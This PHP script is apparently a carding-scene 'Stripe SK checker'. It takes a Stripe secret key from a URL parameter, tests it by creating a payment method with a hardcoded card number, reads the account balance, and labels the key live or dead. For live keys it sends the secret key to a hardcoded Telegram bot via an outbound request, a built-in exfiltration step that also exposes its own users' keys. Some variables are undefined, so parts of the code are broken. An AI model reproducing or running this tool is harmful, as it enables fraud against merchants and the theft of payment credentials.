<?php


//===================== [ MADE BY @Always_sahil ] ====================//
#---------------[ STRIPE MERCHANTE PROXYLESS ]----------------#



error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };

if(isset($_GET['cst'])){

$amt = $_GET['cst'];
}
if(empty($amt)) {
    $amt = '1';
}
    $chr = $amt * 100;



$sk = $_GET['lista'];


   

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";




//================= [ CURL REQUESTS ] =================//


$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . ''); 
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]=5314620054762088&card[exp_month]=05&card[exp_year]=2035&card[cvc]=000'); 
$result1 = curl_exec($ch);



$tok1 = Getstr($result1,'"id": "','"');  
$msg = Getstr($result1,'"message": "','"');  
if (strpos($result1, "livemode"))
    {
  $ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/balance');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
$result2 = curl_exec($ch);
     
$amount = Getstr($result2,'"amount":',',');
$currency = Getstr($result2,'"currency": "','"');     
}
if (strpos($result1, "rate_limit"))
    {
  $ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/balance');  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
$result2 = curl_exec($ch);
$amount = Getstr($result2,'"amount":',',');
$currency = Getstr($result2,'"currency": "','"');     
}


  function send_message($userid, $msg) {
$text = urlencode($msg);
file_get_contents("https://api.telegram.org/bot6258987989:AAEYWILM024B6BD5IDDqbl5H7x40-MCGNvM/sendMessage?chat_id=1243464557&text=$text&parse_mode=HTML");

};

//=================== [ RESPONSES ] ===================//
if(strpos($result1, 'livemode' )) {
    echo '|𝘾𝙃𝘼𝙍𝙂𝙀𝘿</span>  </span>SK:  '.$sk.'</span>  <br>➤ Response: Charged ✅  ';
  echo "<br><b>ID: </b> $tok1";
   echo "<br><b>Ammount: </b>$amount";
   echo "<br><b>Currency: </b>$currency<br><br>";
  send_message($userid, "<b>🟡𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 SK :</b> <code>$lista</code>\n<b>SK ➔<code>$sk</code></b>\n<b>RESPONSE : Live Mode </b>\n<b>SK KEY: LIVE Key ✅</b>\n<b>BY ➔ @MotuSamusa</b>");
}
elseif(strpos($result1,'rate_limit')){
    echo '|𝘾𝙑𝙑</span>  </span>SK:  '.$sk.'</span>  <br>Result: rate_limit';
   echo "<br><b>Ammount: </b>$amount";
   echo "<br><b>Currency: </b>$currency<br><br>";
  send_message($userid, "<b>🟡𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 SK :</b> <code>$lista</code>\n<b>SK ➔<code>$sk</code></b>\n<b>RESPONSE : ♻Live Mode </b>\n<b>SK KEY: Rate-Limit 🟠 </b>\n<b>BY ➔ @MotuSamusa</b>");
}
elseif(strpos($result1, 'Invalid API Key')) {
    echo 'DEAD</span>  </span>Sk:  '.$sk.'</span>  <br>Result: Invalid API Key provided</span><br>';
  }
  elseif(strpos($result1, 'rak_payment_method_write')) {
    echo 'DEAD</span>  </span>Sk:  '.$sk.'</span>  <br>Result: permission would allow this request to continue</span><br>';
  }
  elseif(strpos($result1, 'api_key_expired')) {
    echo 'DEAD</span>  </span>Sk:  '.$sk.'</span>  <br>Result: api_key_expired</span><br>';
  }
    elseif(strpos($result1, 'more_permissions_required_for_application')) {
    echo 'DEAD</span>  </span>Sk:  '.$sk.'</span>  <br>Result: more_permissions_required_for_application</span><br>';
  }
   elseif(strpos($result1, 'The API key provided does not allow requests from your IP address')) {
    echo 'DEAD</span>  </span>Sk:  '.$sk.'</span>  <br>Result: The API key provided does not allow requests from your IP address</span><br>';
  }
elseif(strpos($result1, 'Your account cannot currently make live charges')) {
    echo 'DEAD</span>  </span>Sk:  '.$sk.'</span>  <br>Result: Your account cannot currently make live charges</span><br>';
  }
  else {
      echo '#DIE</span>  </span>CC:  '.$sk.'</span>  <br>Result: '.$result1.' ❌ </span><br>';
}


//===================== [ MADE BY Always_Sahil ] ====================//


//echo "<br><b>Lista:</b> $lista<br>";
//echo "<br><b>CVV Check:</b> $cvccheck<br>";
//echo "<b>D_Code:</b> $dcode<br>";
//
//echo "<b>Risk Level:</b> $riskl<br>";
//echo "<b>Seller Message:</b> $seller_msg<br>";

// echo "<br><b>Result1: </b> $result1<br>";
//  echo "<br><b>Result2: </b> $result2<br>";

curl_close($ch);
ob_flush();
?>